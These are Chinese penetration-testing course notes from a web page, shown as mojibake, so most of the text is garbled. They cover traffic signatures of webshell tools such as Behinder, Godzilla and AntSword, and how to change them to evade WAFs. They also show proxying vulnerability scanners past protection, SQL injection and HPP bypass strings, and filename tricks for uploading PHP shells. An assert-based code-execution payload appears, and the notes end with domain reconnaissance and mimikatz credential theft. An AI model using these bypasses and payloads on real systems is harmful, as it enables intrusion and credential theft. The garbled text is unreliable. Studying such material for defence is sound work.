<p>è¡Œä¸ºåˆ†ææ˜¯ä¸€ç§å®‰å…¨æŠ€æœ¯ï¼Œæ—¨åœ¨è¯†åˆ«æ¶æ„æ´»åŠ¨å’Œæ”»å‡»ï¼Œä¾‹å¦‚ SQL æ³¨å…¥ã€è·¨ç«™è„šæœ¬æ”»å‡»ç­‰ã€‚åœ¨ WAF ä¸­ï¼Œè¡Œä¸ºåˆ†æå¯ä»¥é€šè¿‡æ£€æŸ¥ Web<br>è¯·æ±‚çš„å±æ€§ã€å‚æ•°ã€æ¥æº IP ç­‰ä¿¡æ¯ï¼Œä»è€Œç¡®å®šè¯¥è¯·æ±‚æ˜¯å¦æ˜¯åˆæ³•å’Œå®‰å…¨çš„</p>
</blockquote>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-48"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-48" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>èœåˆ€-æµé‡&amp;ç»•è¿‡&amp;ç‰¹å¾&amp;æ£€æµ‹<br>wafå‘Šè­¦æ—¥å¿—ä¸­æ˜¾ç¤ºç­–ç•¥åŒ¹é…åˆ°eval post</p>
<p>é€šè¿‡wiresharkæŠ“åŒ…ä¹Ÿå¯ä»¥çœ‹åˆ°æ•°æ®åŒ…å†…å®¹</p>
<p>ä¼ å…¥çš„å€¼ä¸­xxå˜é‡ç»è¿‡phpè¿è¡Œç»“æœä¸ºbase_64decode</p>
<p>1ã€ç‰ˆæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2014$P0ST=$REQUEST2016å¯ä»¥</span><br></pre></td></tr></table></figure>

<p>2ã€ç‰¹å¾ï¼š<br>æ•°æ®åŒ…æµé‡ç‰¹å¾ï¼š<br>1,è¯·æ±‚åŒ…ï¼Œä¸­ï¼šuaå¤´ä¸ºç™¾åº¦çˆ¬è™«<br>2,è¯·æ±‚ä½“ä¸­å­˜åœ¨eval,base64ç­‰ç‰¹å¾å­—ç¬¦<br>3,è¯·æ±‚ä½“ä¸­ä¼ é€’çš„payloadä¸ºbase64ç¼–ç ï¼Œå¹¶ä¸”å­˜åœ¨é¢å®šçš„<br>QGluaV9zZXQolmRpc3BsYXIfZXJyb3JzliwiMClpO0BzZXRfdGItZV9saW1pdCgwKTtpZih<br>QSFBfVkVSUOIPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1IKDApO307<br>ZWNobygiWEBZlik7J</p>
<p>å†°è-æµé‡&amp;ç»•è¿‡&amp;ç‰¹å¾&amp;æ£€æµ‹<br>å“¥æ–¯æ‹‰-æµé‡&amp;ç»•è¿‡&amp;ç‰¹å¾&amp;æ£€æµ‹</p>
<p>å†°ç«­æµé‡&amp;ç»•è¿‡&amp;ç‰¹å¾&amp;æ£€æµ‹</p>
<p>è¯·æ±‚æ­£æ–‡å…¨éƒ¨ä¸ºAESåŠ å¯†ï¼ˆAESåŠ å¯†çš„ç‰¹åˆ™å«æœ‰&#x2F;&#x2F;&#x2F;ï¼Œå¤§å°å†™æ··æ‚ï¼Œbase64åŠ å¯†å«æœ‰&#x3D;ï¼‰AESåŠ å¯†éœ€è¦çŸ¥é“å¯†åŒ™ã€åç§»é‡ã€åŠ å¯†æ¨¡å¼ç­‰</p>
<p>1ã€ä»‹ç»<br>å†°èåˆ©ç”¨äº†æœåŠ¡å™¨ç«¯çš„è„šæœ¬è¯­è¨€åŠ äº§åŠŸèƒ½ï¼Œé€šè®¯çš„è¿‡ç¨‹ä¸­ï¼Œ<br>æ¶ˆæ¯ä½“å†…å®¹é‡‡ç”¨AESåŠ å¯†ï¼ŒåŸºäºç‰¹å¾å€¼æ£€æµ‹çš„å®‰å…¨äº§å“æ— æ³•æŸ¥å‡ºã€‚<br>2ã€é€šè®¯<br>ä»¥ä»£ç Keyä¸ºå¯†åŒ™çš„AESåŠ å¯†è§£å¯†è¿‡ç¨‹<br>3ã€<br>ç‰¹å¾ï¼š<br>1ã€User-agent:ä»£ç ä¸­å®šä¹‰<br>2ã€Pragma:no-cache<br>3.Content-Type:application&#x2F;x-www-form-urlencoded<br>4ã€Accept<br>text&#x2F;html,application&#x2F;xhtml+xml.application&#x2F;xml:q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng.*&#x2F;;q&#x3D;0.8.a<br>5.Accept-Encoding:gzip,deflate,br<br>6 Accept-Language:zh-CN,zh;q&#x3D;0.9,en-US:q&#x3D;0.8,en;q&#x3D;0.7</p>
<p>å“¥æ–¯æ‹‰æµé‡&amp;ç»•è¿‡&amp;ç‰¹å¾&amp;æ£€æµ‹<br>1ã€é€šè®¯åŠ å¯†è§å›¾<br>2ã€ç‰¹å¾ï¼š<br>1.User-Agent Mozilla&#x2F;5.0 (Windows NT 10.0;Win64;x64:rv:84.0)Gecko&#x2F;20100101<br>Firefox&#x2F;84.0<br>2.Accept text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml:q&#x3D;0.9,image&#x2F;webp,&#x2F;:q&#x3D;0.8<br>3.Accept-Language:zh-CN,zh;q&#x3D;0.8,zh-TW:q&#x3D;0.7,zh-HK:q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>4ã€Cookie:PHPSESSID&#x3D;ut2a51prs0470jvfe2q502o44 cookietæœ€åé¢å­˜åœ¨-ä¸ªâ€ï¼Œâ€</p>
<h4 id="æ‹“å±•-å†°èæµé‡ç‰¹å¾"><a href="#æ‹“å±•-å†°èæµé‡ç‰¹å¾" class="headerlink" title="æ‹“å±• å†°èæµé‡ç‰¹å¾"></a>æ‹“å±• å†°èæµé‡ç‰¹å¾</h4><p>å†°è<br>å†°èå…¶æœ€å¤§ç‰¹ç‚¹å°±æ˜¯å¯¹äº¤äº’æµé‡è¿›è¡ŒAESå¯¹ç§°åŠ å¯†ï¼Œä¸”åŠ å¯†ç§˜é’¥æ˜¯ç”±éšæœºæ•°å‡½æ•°åŠ¨æ€ç”Ÿæˆï¼Œå› æ­¤è¯¥å®¢æˆ·ç«¯çš„æµé‡å‡ ä¹æ— æ³•æ£€æµ‹<br>1ã€é€šè¿‡å¯†é’¥åå•†çš„è¿‡ç¨‹ä¸­çš„ä¸€äº›ç‰¹å¾æ¥æ£€æµ‹å…¶ä»–<br>è€ç‰ˆå†°èå·¥å…·åœ¨è¿æ¥Webshellçš„æ—¶å€™ä¼šå­˜åœ¨ä¸€ä¸ªå¯†é’¥åå•†çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯çº¯æ˜æ–‡çš„æ•°æ®äº¤æ¢ï¼Œå†°èå­˜åœ¨è¿™æ ·çš„ç‰¹å¾ï¼šå‘èµ·ä¸€å…±ä¸¤æ¬¡çš„å¯†é’¥åå•†ï¼Œé€šè¿‡æ¯”è¾ƒä¸¤æ¬¡å¯†é’¥åå•†çš„è¿”å›åŒ…ä¸­å†…å®¹çš„ä¸åŒéƒ¨åˆ†æ¥è·å–å…¶ä¸­çš„å¯†é’¥ã€‚<br>åœ¨è¿™ä¸ªåå•†è¿‡ç¨‹ä¸­ï¼Œé˜²æŠ¤è®¾å¤‡å¯ä»¥ç»“åˆURLã€è¯·æ±‚åŒ…å’Œè¿”å›åŒ…çš„å†…å®¹ä»¥åŠå¤´éƒ¨ä¿¡æ¯æ¥ç»¼åˆè¿›è¡Œåˆ¤æ–­ï¼Œè¿™ç§ç±»å‹æ£€æµ‹çš„ä¼˜åŠ¿æ˜¯è¿™éƒ¨åˆ†çš„æµç¨‹æ˜¯å†°èå†…ç½®çš„å®ç°ï¼Œæ”»å‡»è€…ä¸å¤ªå¥½è¿›è¡Œä¿®æ”¹ç»•è¿‡ã€‚è€ŒåŠ£åŠ¿æ˜¯åœ¨å¤§æµé‡çš„ç¯å¢ƒä¸‹å¾ˆå®¹æ˜“å¼•èµ·å¤§é‡çš„è¯¯æŠ¥ã€‚<br>2ã€é€šè¿‡Shelläº¤äº’è¿‡ç¨‹ä¸­çš„HTTPè¯·æ±‚ç‰¹å¾æ¥æ£€æµ‹<br>å†°èåœ¨å‘é€HTTPè¯·æ±‚æ—¶å­˜åœ¨ä¸€äº›ç‰¹å¾ï¼Œä¾‹å¦‚å…¶å·¥å…·ä¸­å†…ç½®äº†17ä¸ªUser-Agentå¤´ï¼Œåœ¨ç”¨æˆ·æ²¡æœ‰è‡ªå®šä¹‰çš„æƒ…å†µä¸‹ä¼šéšæœºé€‰æ‹©ä¸€ä¸ªå‘é€ã€‚ä½†æ˜¯è¿™äº›User-Agentå¤´å¤§éƒ¨åˆ†æ˜¯ä¸€äº›è€ç‰ˆæœ¬çš„æµè§ˆå™¨æˆ–è®¾å¤‡ã€‚è¿™ä¸ªç±»å‹æ£€æµ‹çš„ä¼˜åŠ¿æ˜¯æ£€æµ‹æ–¹å¼æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯åœ¨å¤§æµé‡çš„ç¯å¢ƒä¸‹å¾ˆå®¹æ˜“å¼•èµ·è¯¯æŠ¥ï¼Œä¸€èˆ¬ä½¿ç”¨å¤šä¸ªç‰¹å¾ç›¸ç»“åˆçš„æ–¹æ³•æ¥æ”¹å–„è¯¯æŠ¥çš„æƒ…å†µï¼Œå¹¶ä¸”è¿™éƒ¨åˆ†çš„ç‰¹å¾é€šå¸¸æ˜¯ä¸€äº›å¼±ç‰¹å¾ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å®šåˆ¶è¯·æ±‚å¤´ã€ä½¿ç”¨ä»£ç†ç­‰æ–¹å¼ä¿®æ”¹å†°èçš„è¯·æ±‚åŒ…å¾ˆè½»æ˜“çš„æ¥ç»•è¿‡è¿™ç±»çš„æ£€æµ‹ã€‚<br>3ã€é€šè¿‡Webshellä¸Šä¼ æ—¶çš„æµé‡ç‰¹å¾æ¥æ£€æµ‹<br>åœ¨çœŸå®çš„æ”»å‡»åœºæ™¯ä¸‹ï¼Œæ”»å‡»è€…é€šå¸¸æ˜¯é€šè¿‡æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶å†™å…¥ç­‰æ–¹å¼æ¥å†™å…¥å†°èçš„Webshellï¼Œæ‰€ä»¥æµé‡è®¾å¤‡ä¹Ÿå¯ä»¥é€šè¿‡æ£€æµ‹æ”»å‡»åœºæ™¯çš„æ•°æ®åŒ…æ¥å‘ç°å†°èçš„å­˜åœ¨ã€‚è¿™éƒ¨åˆ†çš„æµé‡å½¢å¼ä¸»è¦å–å†³äºWebåº”ç”¨ï¼Œæ˜¯æ”»å‡»è€…ä¸å¥½æ§åˆ¶çš„ï¼Œè€Œä¸”é€šå¸¸éƒ½æ˜¯ä»¥æ˜æ–‡å½¢å¼è¿›è¡Œä¼ è¾“ï¼Œæ‰€ä»¥æ¯”è¾ƒæ˜“äºæ£€æµ‹ã€‚<br>ä½†æ˜¯è¿™ç§æ£€æµ‹æ–¹å¼åœ¨é‡åˆ°éæ–‡ä»¶ä¸Šä¼ ç­‰æ¼æ´æ—¶ï¼Œæœ‰å¯èƒ½æ— æ³•æ•æ‰åˆ°Webshellçš„ç‰¹å¾ã€‚<br>å†°è3.0<br>ä»é˜²å®ˆæ–¹çš„è§’åº¦çœ‹ï¼Œè¿™äº›æ”¹åŠ¨ä¸­å¯¹é˜²å¾¡è®¾å¤‡å½±å“æœ€å¤§çš„æ˜¯ç¬¬1ç‚¹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ3.0ç‰ˆæœ¬çš„å†°èä¸åœ¨æœ‰å¯†é’¥åå•†çš„è¿‡ç¨‹ï¼Œä»åŸç†ä¸Šç›´æ¥ç»•è¿‡äº†å¤§é‡æµé‡æ£€æµ‹è®¾å¤‡ï¼ˆå¤§éƒ¨åˆ†è®¾å¤‡æ˜¯é€šè¿‡æ¡æ‰‹çš„è¡Œä¸ºæ¥æ£€æµ‹å†°èçš„æµé‡ï¼‰</p>
<p>èšå‰‘<br>1ã€ç¼–ç å™¨æ”¹é€  èšå‰‘åœ¨æ•°æ®åŒ…ä¸­å®é™…ä¸Šæ˜¯å°†è§£ç å‡½æ•°ä¸€åŒå‘é€åˆ°æœåŠ¡ç«¯ï¼Œé‚£å‡ ä¸ªè§£ç å‡½æ•°æ˜¯æ²¡æ³•åŠ å¯†çš„ï¼Œæ‰€ä»¥äº§ç”Ÿä¸€ä¸ªå¾ˆæ˜æ˜¾ çš„æµé‡ç‰¹å¾ï¼Œèšå‰‘ä¹Ÿæ”¯æŒä½¿ç”¨è€…è‡ªå®šä¹‰ç¼–ç å™¨å’Œè§£ç å™¨<br>2ã€è¯·æ±‚å¤´ä¿®æ”¹ èšå‰‘é»˜è®¤çš„æ•°æ®åŒ…é‡Œéƒ½æºå¸¦äº†ç‰¹åˆ«æ˜æ˜¾çš„è¯·æ±‚å¤´ä¿¡æ¯ï¼šUser-Agent: antSword&#x2F;v2.1ï¼Œå¯¹WAFæ¥è¯´è¿™ç®€ç›´ æ˜¯è‡ªæŠ¥å®¶é—¨</p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>å†°èæ”¹é€ å°†åŠ¨æ€çš„AESå¯†é’¥å†™æ­»åœ¨webshellé‡Œï¼Œå¯ä»¥å‡å°‘å¾ˆå¤šç‰¹å¾ã€‚<br>èšå‰‘å°±æ˜¯å°†è§£ç å‡½æ•°å†™æ­»åœ¨webshell é‡Œï¼Œä¹Ÿå¯ä»¥æœ‰æ•ˆç»•è¿‡WAFæ£€æµ‹</p>
<h1 id="ç¬¬ä¸ƒåä¹å¤©-WAFæ”»é˜²-æ¼æ´å‘ç°-åè®®-ä»£ç†æ± -Goby-AWVS-Xray"><a href="#ç¬¬ä¸ƒåä¹å¤©-WAFæ”»é˜²-æ¼æ´å‘ç°-åè®®-ä»£ç†æ± -Goby-AWVS-Xray" class="headerlink" title="ç¬¬ä¸ƒåä¹å¤© WAFæ”»é˜²-æ¼æ´å‘ç°&amp;åè®®&amp;ä»£ç†æ± &amp;Goby&amp;AWVS&amp;Xray"></a>ç¬¬ä¸ƒåä¹å¤© WAFæ”»é˜²-æ¼æ´å‘ç°&amp;åè®®&amp;ä»£ç†æ± &amp;Goby&amp;AWVS&amp;Xray</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-55"><a href="#çŸ¥è¯†ç‚¹ï¼š-55" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€Http&#x2F;s&amp;Sock5åè®®<br>2ã€Awvs Xray&amp;Gobyä»£ç†<br>3ã€Pxoxifierè¿›ç¨‹ä»£ç†ä½¿ç”¨<br>4ã€Safedog&amp;BT&amp;Aliyuné˜²æŠ¤</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-49"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-49" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>Awwsæ¼æ‰«-Sadedog-ç™½åå•-å†…ç½®<br>Awwsæ¼æ‰«-BT&amp;Aliyun-ä»£ç†æ± -å†…ç½®<br>Xrayæ¼æ‰«-BT&amp;Aliyun-Proxifier-.è¿›ç¨‹<br>Gobyæ¼æ‰«-BT&amp;Aliyun-Socket5-å†…ç½®</p>
<p>åœ¨æ¼æ´å‘ç°ä¸­ï¼ŒWAFä¼šå¯¹ä¸‰ä¸ªæ–¹å‘è¿›è¡Œè¿‡æ»¤æ‹¦æˆªï¼š<br>1ã€é€Ÿåº¦æµé‡é—®é¢˜<br>2ã€å·¥å…·çš„æŒ‡çº¹è¢«è¯†åˆ«<br>3ã€å·¥å…·çš„æ£€æµ‹Pocæˆ–Payload</p>
<p>Awvsæ¼æ‰«-Sadedog-ç™½åå•-å†…ç½®<br>åŠ å…¥ç™½åå•æ‰«æï¼Œé˜²Safedogæ‹‰é»‘IP</p>
<p>Awwsæ¼æ‰«-BT&amp;Aliyun-ä»£ç†æ± -å†…ç½®</p>
<p>Xrayæ¼æ‰«-BT&amp;Aliyun-Proxifier-.è¿›ç¨‹</p>
<p>proxifieræ·»åŠ ä»£ç†æœåŠ¡å™¨</p>
<p>æ·»åŠ ä»£ç†è§„åˆ™ ä½¿å¾—xrayæµé‡ç»è¿‡ä»£ç†æœåŠ¡å™¨è®¿é—®ç›®æ ‡ç«™ç‚¹</p>
<p>Gobyæ¼æ‰«-BT&amp;Aliyun-Socket5-å†…ç½®</p>
<p>å¯¹äºä¸é€šè¿‡httpså¯¹ç½‘ç«™æˆ–æ“ä½œç³»ç»Ÿè¿›è¡Œä¿¡æ¯æ”¶é›†çš„ç¨‹åºå¯ä»¥ä½¿ç”¨socket5ä»£ç†è¿›è¡Œæµé‡è½¬å‘</p>
<p>sqlmayè®¾ç½®ä»£ç†è®¾ç½®éšæœºUAå¤´</p>
<h1 id="ç¬¬å…«åå¤©-WAFæ”»é˜²-æ¼æ´åˆ©ç”¨-HPPæ±¡æŸ“-åˆ†å—ä¼ è¾“-åƒåœ¾æ•°æ®"><a href="#ç¬¬å…«åå¤©-WAFæ”»é˜²-æ¼æ´åˆ©ç”¨-HPPæ±¡æŸ“-åˆ†å—ä¼ è¾“-åƒåœ¾æ•°æ®" class="headerlink" title="ç¬¬å…«åå¤© WAFæ”»é˜²-æ¼æ´åˆ©ç”¨&amp;HPPæ±¡æŸ“&amp;åˆ†å—ä¼ è¾“&amp;åƒåœ¾æ•°æ®"></a>ç¬¬å…«åå¤© WAFæ”»é˜²-æ¼æ´åˆ©ç”¨&amp;HPPæ±¡æŸ“&amp;åˆ†å—ä¼ è¾“&amp;åƒåœ¾æ•°æ®</h1><h4 id="å‚è€ƒç‚¹ï¼š"><a href="#å‚è€ƒç‚¹ï¼š" class="headerlink" title="å‚è€ƒç‚¹ï¼š"></a>å‚è€ƒç‚¹ï¼š</h4><p>#å°†MySQLæ³¨å…¥å‡½æ•°åˆ†ä¸ºå‡ ç±»<br>æ‹†åˆ†å­—ç¬¦ä¸²å‡½æ•°ï¼šmidã€1eftã€1padç­‰<br>ç¼–ç å‡½æ•°ï¼šordã€hexã€a3ciç­‰<br>è¿ç®—å‡½æ•°ï¼šÂ±*&#x2F;&amp;^ï¼1 ike rlike regç­‰<br>ç©ºæ ¼æ›¿æ¢éƒ¨åˆ†ï¼š09ã€0aã€0bã€0cã€0dç­‰<br>å…³é”®æ•°æ®å‡½æ•°ï¼šuserï¼ˆï¼‰ã€versionï¼ˆï¼‰ã€databaseï¼ˆï¼‰ç­‰<br>ç„¶åå°†è¿™äº›ä¸åŒç±»å‹çš„å‡½æ•°ç»„åˆæ‹¼æ¥åœ¨ä¸€èµ·</p>
<p>ä¸Šä¼ å‚æ•°åè§£æï¼šæ˜ç¡®å“ªäº›ä¸œè¥¿èƒ½ä¿®æ”¿ï¼Ÿ<br>Content-Di3 position:ä¸€èˆ¬å¯æ›´æ”¹<br>name:è¡¨å•å‚æ•°å€¼ï¼Œä¸èƒ½æ›´æ”¹<br>filename:æ–‡ä»¶åï¼Œå¯ä»¥æ›´æ”¹<br>Content-Type:æ–‡ä»¶MIME,è§†æƒ…å†µæ›´æ”¹</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-50"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-50" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>å®‰å…¨ç‹—-SQLæ³¨å…¥&amp;æ–‡ä»¶ä¸Šä¼ -çŸ¥è¯†ç‚¹<br>å®‰å…¨ç‹—-æ–‡ä»¶åŒ…å«&amp;ä»£ç æ‰§è¡Œ-çŸ¥è¯†ç‚¹<br>BT&amp;Aliyun-SQLæ³¨å…¥&amp;æ–‡ä»¶ä¸Šä¼ -çŸ¥è¯†ç‚¹<br>BT&amp;Aliyun-æ–‡ä»¶åŒ…å«&amp;ä»£ç æ‰§è¡Œ-çŸ¥è¯†ç‚¹</p>
<p>å®‰å…¨ç‹—-SQLæ³¨å…¥&amp;æ–‡ä»¶ä¸Šä¼ -çŸ¥è¯†ç‚¹</p>
<p>SQLæ³¨å…¥ <a href="https://www.cnblogs.com/cute-puli/p/11146625.html">https://www.cnblogs.com/cute-puli/p/11146625.html</a><br>å…³é”®å­—æ›¿æ¢<br>ä½¿ç”¨like ä»£æ›¿ and<br>æ›´æ¢æäº¤æ–¹å¼ï¼š<br>POST id&#x3D;-1 union select 1,2,3â€“+</p>
<p>æ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ ä¼ é€’æ•°æ®<br>åˆ†å—ä¼ è¾“ï¼šæ›´æ”¹æ•°æ®è¯·æ±‚æ ¼å¼<br>å‰ææäº¤æ–¹å¼å¿…é¡»ä¸ºPOST<br><a href="https://github.com/cOny1/chunked-coding-converter">https://github.com/cOny1/chunked-coding-converter</a><br>HPPå‚æ•°æ±¡æŸ“ï¼šid&#x3D;1&#x2F;**&amp;id&#x3D;-1å·20 unionå·203e1ectå·201,2,3å·23*&#x2F;</p>
<p>æ–‡ä»¶ä¸Šä¼ ï¼šæ¢è¡Œè§£æ&amp;åƒåœ¾æº¢å‡º&amp;00å¹²æ‰°&amp;&#x3D;ç¬¦å·å¹²æ‰°&amp;å‚æ•°æ¨¡æ‹Ÿ<br>filename&#x3D;a.php<br>filename&#x3D;â€a.php<br>filename&#x3D;â€œa.phpå·%00â€<br>åƒåœ¾æ•°æ®ï¼›filename&#x3D;â€œa.phpâ€<br>æ— é™filename;filename&#x3D;â€œa,phpâ€<br>filename&#x3D;&#x3D;â€œa.phpâ€<br>filename&#x3D;â€œname&#x3D;â€™uploadfile.phpâ€6</p>
<p>filename&#x3D;â€œContent-Disposition:form-data.phpâ€<br>filename&#x3D;&#x3D;â€œa.phpâ€</p>
<p>BT&amp;Aliyun-æ–‡ä»¶åŒ…å«&amp;ä»£ç æ‰§è¡Œ-çŸ¥è¯†ç‚¹<br><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>python xsstrike.py -u<br>â€œ<a href="http://test.xiaodi8.com/pikachu/vul/xss/xss">http://test.xiaodi8.com/pikachu/vul/xss/xss</a> reflected get.php?mes<br>sage&#x3D;1&amp;submit&#x3D;submitâ€â€“proxy<br>txt&#x3D;Sy&#x3D;str replace(â€˜xâ€™,â€˜â€™,â€˜pxhpxinxfoï¼ˆï¼‰â€™);assert ($y);&amp;submit&#x3D;8688<br>Fì‘90ì‘E4ìš©BAì‘A4<br>æ–‡ä»¶åŒ…å«ï¼šæ²¡ä»€ä¹ˆå¥½è¯´çš„å°±è¿™å‡ ç§<br>â€¦Â·&#x2F;â€¦1ç­‰</p>
<p>å®‰å…¨ç‹—ï¼š<br>æ³¨å…¥ssæ–‡ä»¶ä¸Šä¼ æ‹¦æˆª<br>rceæ–‡ä»¶åŒ…å«ç­‰å…¶ä»–ä¸æ‹¦æˆª<br>å®å¡”ï¼š<br>æ³¨å…¥ä¸Šä¼ æ‹¦æˆª<br>rceæ–‡ä»¶åŒ…å«Xssç­‰å…¶ä»–ä¸æ‹¦æˆª<br>å…¶ä¸­æ‹¦æˆªçš„æ˜¯å…³é”®å­—<br>aliyun<br>æ‹¦æˆªçš„CCé€Ÿåº¦å’Œåé—¨ä¿¡æ¯æ”¶é›†å’Œæƒé™ç»´æŒé˜¶æ®µæ‹¦æˆª<br>æ¼æ´åˆ©ç”¨ä»–ä¸æ‹¦æˆªé»˜è®¤çš„ç‰ˆæœ¬ï¼ˆå‡çº§ç‰ˆæœ¬æ²¡æµ‹è¯•ï¼‰</p>
<p>ç”±äºè¿™æ®µæ—¶é—´å»æ‰“æ˜¥ç§‹äº‘é•œçš„å†…ç½‘é¶åœºå»äº†ï¼Œæ‰€ä»¥å°±å…ˆçœ‹å†…ç½‘çš„äº†ï¼Œåè¾¹å°±æ˜¯å…ˆä»å†…ç½‘çš„çŸ¥è¯†ç‚¹å¼€å§‹ã€‚</p>
<h1 id="ç¬¬122å¤©ï¼šå†…ç½‘å®‰å…¨-åŸŸä¿¡æ¯æ”¶é›†-åº”ç”¨ç½‘ç»œå‡­æ®-CSæ’ä»¶-Adfind-BloodHound"><a href="#ç¬¬122å¤©ï¼šå†…ç½‘å®‰å…¨-åŸŸä¿¡æ¯æ”¶é›†-åº”ç”¨ç½‘ç»œå‡­æ®-CSæ’ä»¶-Adfind-BloodHound" class="headerlink" title="ç¬¬122å¤©ï¼šå†…ç½‘å®‰å…¨-åŸŸä¿¡æ¯æ”¶é›†&amp;åº”ç”¨ç½‘ç»œå‡­æ®&amp;CSæ’ä»¶&amp;Adfind&amp;BloodHound"></a>ç¬¬122å¤©ï¼šå†…ç½‘å®‰å…¨-åŸŸä¿¡æ¯æ”¶é›†&amp;åº”ç”¨ç½‘ç»œå‡­æ®&amp;CSæ’ä»¶&amp;Adfind&amp;BloodHound</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-56"><a href="#çŸ¥è¯†ç‚¹ï¼š-56" class="headerlink" title="#çŸ¥è¯†ç‚¹ï¼š"></a>#çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€åŸŸäº§ç”ŸåŸå› </p>
<p>2ã€å†…ç½‘åŸŸçš„åŒºåˆ«</p>
<p>3ã€å¦‚ä½•åˆ¤æ–­åœ¨åŸŸå†…</p>
<p>4ã€åŸŸå†…å¸¸è§ä¿¡æ¯æ”¶é›†</p>
<p>5ã€åŸŸå†…è‡ªåŠ¨åŒ–å·¥å…·æ”¶é›†</p>
<p>-å±€åŸŸç½‘&amp;å·¥ä½œç»„&amp;åŸŸç¯å¢ƒåŒºåˆ«</p>
<p>-åŸŸç¯å¢ƒä¿¡æ¯æ”¶é›†-åº”ç”¨&amp;ç½‘ç»œ&amp;æœåŠ¡&amp;å‡­æ®ç­‰</p>
<p>-è‡ªåŠ¨åŒ–å·¥å…·ä½¿ç”¨-CS æ’ä»¶&amp;Adfind&amp;BloodHound</p>
<p>0x01</p>
<p>ä¸€ä¸ªå…·æœ‰ä¸€å®šè§„æ¨¡çš„ä¼ä¸šï¼Œæ¯å¤©éƒ½å¯èƒ½é¢ä¸´å‘˜å·¥å…¥èŒå’Œç¦»èŒï¼Œå› æ­¤ç½‘ç»œç®¡ç†éƒ¨é—¨ç»å¸¸éœ€è¦</p>
<p>å¯¹åŸŸæˆå‘˜ä¸»æœºè¿›è¡Œæ ¼å¼åŒ–æ¶ˆé™¤ç£ç›˜çš„æ–‡ä»¶ï¼Œç„¶åé‡è£…ç³»ç»ŸåŠè½¯ä»¶ï¼Œä»¥æä¾›ç»™æ–°å‘˜å·¥ä½¿ç”¨ï¼›</p>
<p>å› æ­¤ï¼Œä¸ºäº†ä¾¿äºåæœŸäº¤æ¥ï¼Œå¤§å¤šç½‘ç»œç®¡ç†å‘˜ä¼šåšå¥½ä¸€ä¸ªç³»ç»Ÿé•œåƒç›˜ï¼Œç»Ÿä¸€å®‰è£…æ‰€æœ‰çš„ç”µ</p>
<p>è„‘ï¼Œå¹¶ä¸”åœ¨å®‰è£…çš„æ—¶å€™è®¾ç½®æƒ¯ç”¨ã€ç”šè‡³ç»Ÿä¸€çš„å¯†ç ã€‚</p>
<p>0x02</p>
<p>å› æ­¤ï¼ŒåŸŸä¸­çš„è®¡ç®—æœºæœ¬åœ°ç®¡ç†å‘˜è´¦å·ï¼Œææœ‰å¯èƒ½èƒ½å¤Ÿç™»é™†åŸŸä¸­è¾ƒå¤šçš„è®¡ç®—æœºï¼Œæœ¬åœ°ç®¡ç†å‘˜</p>
<p>çš„å¯†ç åœ¨æœåŠ¡å™¨ä¸ŠåæœŸä¿®æ”¹çš„æ¦‚ç‡ï¼Œè¿œä½äºåœ¨ä¸ªäººåŠå…¬ç”µè„‘ä¸Šçš„æ¦‚ç‡ï¼Œè€ŒåŸŸç”¨æˆ·æƒé™æ˜¯è¾ƒ</p>
<p>ä½çš„ï¼Œæ˜¯æ— æ³•åœ¨åŸŸæˆå‘˜ä¸»æœºä¸Šå®‰è£…è½¯ä»¶çš„ï¼Œè¿™å°†ä¼šå‘ç”Ÿä¸‹é¢çš„ä¸€å¹•ï¼š</p>
<p>æŸä¸ªåŸŸç”¨æˆ·éœ€è¦ä½¿ç”¨ viso è½¯ä»¶è¿›è¡Œç»˜å›¾æ“ä½œï¼Œäºæ˜¯è”ç³»ç½‘ç»œç®¡ç†å‘˜è¿›è¡Œå®‰è£…ï¼Œç½‘ç»œç®¡ç†</p>
<p>å‘˜é‡‡ç”¨åŸŸç®¡ç†å‘˜èº«ä»½ç™»å½•äº†åŸŸæˆå‘˜ä¸»æœºï¼Œå¹¶å¸®åŠ©å…¶å®‰è£…äº† viso è½¯ä»¶ï¼Œäºæ˜¯è¿™ä¸ªæœ‰è®¡ç®—æœº</p>
<p>åŸºç¡€çš„å‘˜å·¥ï¼Œåˆ‡æ¢èº«ä»½ç™»å½•åˆ°äº†æœ¬åœ°è®¡ç®—æœºçš„ç®¡ç†å‘˜ï¼Œåæ‰§è¡Œ mimikatzï¼Œä»å†…å­˜å½“ä¸­æŠ“</p>
<p>å–äº†åŸŸç®¡ç†å‘˜çš„å¯†ç ï¼Œä¾¿æˆåŠŸçš„æ§åˆ¶äº†æ•´ä¸ªåŸŸã€‚</p>
<p>0x03</p>
